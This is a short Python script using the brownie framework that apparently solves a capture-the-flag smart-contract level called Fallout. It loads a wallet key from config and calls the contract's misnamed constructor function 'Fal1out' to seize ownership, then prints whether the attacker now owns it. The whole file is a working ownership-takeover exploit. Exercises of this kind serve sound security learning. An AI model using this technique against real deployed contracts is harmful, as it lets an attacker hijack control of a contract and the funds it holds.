from brownie import accounts, config, interface, web3, Fallout

def attack(target, hacker):
    fallout = interface.IFallout(target)
    fallout.Fal1out({"from": hacker})
    print(f"Owner is hacker: {fallout.owner() == hacker}")


def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    attack(target, hacker)
